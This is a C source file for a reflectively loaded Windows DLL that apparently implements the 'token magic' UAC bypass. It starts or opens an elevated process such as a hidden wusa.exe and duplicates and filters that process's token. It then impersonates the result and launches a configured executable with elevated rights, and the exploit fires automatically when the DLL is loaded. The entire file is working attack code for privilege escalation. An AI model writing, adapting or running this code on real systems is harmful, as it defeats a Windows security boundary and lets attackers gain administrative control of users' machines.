#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include <shellapi.h>

typedef struct _Config
{
	DWORD elev_pid;
	wchar_t random[16];
	wchar_t executable_path[MAX_PATH];
} Config;

typedef __success(return >= 0) LONG NTSTATUS;

typedef enum
{
	FTF_None = 0x0,
	FTF_DisableMaxPrivileges = 0x1,
	FTF_SandboxInert = 0x2,
	FTF_LuaToken = 0x4,
	FTF_WriteRestricted = 0x8
} FilterTokenFlags;

NTSTATUS NtFilterToken(HANDLE tokenHandle, FilterTokenFlags flags, PTOKEN_GROUPS sidsToDisable, PTOKEN_PRIVILEGES privilegesToDelete, PTOKEN_GROUPS restrictedSids, PHANDLE newTokenHandle)
{
	typedef NTSTATUS(NTAPI*PNtFilterToken)(HANDLE tokenHandle, FilterTokenFlags flags, PTOKEN_GROUPS sidsToDisable, PTOKEN_PRIVILEGES privilegesToDelete, PTOKEN_GROUPS restrictedSids, PHANDLE newTokenHandle);
	PNtFilterToken func = NULL;

	if (func == NULL)
	{
		func = (PNtFilterToken)GetProcAddress(GetModuleHandle(TEXT("ntdll")), "NtFilterToken");
	}

	if (func != NULL)
	{
		return func(tokenHandle, flags, sidsToDisable, privilegesToDelete, restrictedSids, newTokenHandle);
	}

	return -1;
}

NTSTATUS NtSetInformationToken(HANDLE tokenHandle, TOKEN_INFORMATION_CLASS tokenInformationClass, PVOID tokenInformation, ULONG tokenInformationLength)
{
	typedef NTSTATUS(NTAPI*PNtSetInformationToken)(HANDLE tokenHandle, TOKEN_INFORMATION_CLASS tokenInformationClass, PVOID tokenInformation, ULONG tokenInformationLength);
	static PNtSetInformationToken func = NULL;

	if (func == NULL)
	{
		func = (PNtSetInformationToken)GetProcAddress(GetModuleHandle(TEXT("ntdll")), "NtSetInformationToken");
	}

	if (func != NULL)
	{
		return func(tokenHandle, tokenInformationClass, tokenInformation, tokenInformationLength);
	}

	return -1;
}

DWORD bypassuac_tokenmagic(Config* config)
{
	HANDLE hProcess = NULL;
	HANDLE hProcessToken = NULL;
	HANDLE hDupProcessToken = NULL;
	PSID pSID = NULL;
	HANDLE hLuaToken = NULL;
	HANDLE hDupLuaToken = NULL;

	do
	{
		if (config->elev_pid != 0)
		{
			hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, config->elev_pid);
		}
		else
		{
			// no PID given, so kick off wusa.exe
			SHELLEXECUTEINFO sei = { 0 };
			sei.cbSize = sizeof(sei);
			sei.fMask = SEE_MASK_NOCLOSEPROCESS;
			sei.lpFile = TEXT("wusa.exe");
			sei.nShow = SW_HIDE;

			if (ShellExecuteEx(&sei))
			{
				hProcess = sei.hProcess;
			}
		}

		if (hProcess == NULL)
		{
			// failed to get a process handle.
			break;
		}

		// TODO: determine exactly what 0x02000000 is!
		if (!OpenProcessToken(hProcess, 0x02000000, &hProcessToken))
		{
			// Failed to get the required process token
			break;
		}

		SECURITY_ATTRIBUTES sa = { 0 };
		sa.nLength = sizeof(sa);

		if (!DuplicateTokenEx(hProcessToken, STANDARD_RIGHTS_REQUIRED | TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDupProcessToken))
		{
			// failed to duplicate the token
			break;
		}

		// TODO: determmine what the 0x10 is.
		SID_IDENTIFIER_AUTHORITY sia = { 0 };
		sia.Value[5] = 0x10;
		// TODO: determine what the 0x2000 is.
		if (!AllocateAndInitializeSid(&sia, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, &pSID))
		{
			// Failed to get the SID set up
			break;
		}

		TOKEN_MANDATORY_LABEL tml = { 0 };
		tml.Label.Sid = pSID;
		tml.Label.Attributes = SE_GROUP_INTEGRITY;

		if (NtSetInformationToken(hDupProcessToken, TokenIntegrityLevel, &tml, sizeof(tml)) != 0)
		{
			// Failed to lower the token mandatory IL
			break;
		}

		if (NtFilterToken(hDupProcessToken, FTF_LuaToken, NULL, NULL, NULL, &hLuaToken) != 0)
		{
			// Failed to create restricted token
			break;
		}

		SECURITY_ATTRIBUTES sa2 = { 0 };
		sa2.nLength = sizeof(sa2);

		if (!DuplicateTokenEx(hLuaToken, TOKEN_IMPERSONATE | TOKEN_QUERY, &sa2, SecurityImpersonation, TokenImpersonation, &hDupLuaToken))
		{
			// failed to duplicate the lua/restricted token
			break;
		}

		if (!ImpersonateLoggedOnUser(hDupLuaToken))
		{
			// failed impersonation
			break;
		}

		STARTUPINFO si = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		PROCESS_INFORMATION pi = { 0 };

		CreateProcessWithLogonW(config->random, config->random, config->random, LOGON_NETCREDENTIALS_ONLY, config->executable_path, NULL, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &si, &pi);
	} while (0);

	if (pSID != NULL)
	{
		FreeSid(pSID);
	}

	if (hDupLuaToken != NULL)
	{
		CloseHandle(hDupLuaToken);
	}

	if (hDupProcessToken != NULL)
	{
		CloseHandle(hDupProcessToken);
	}

	if (hProcessToken != NULL)
	{
		CloseHandle(hProcessToken);
	}

	if (hProcess != NULL)
	{
		if (config->elev_pid == 0)
		{
			TerminateProcess(hProcess, 1);
		}
		else
		{
			CloseHandle(hProcess);
		}
	}

	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		bypassuac_tokenmagic((Config*)lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
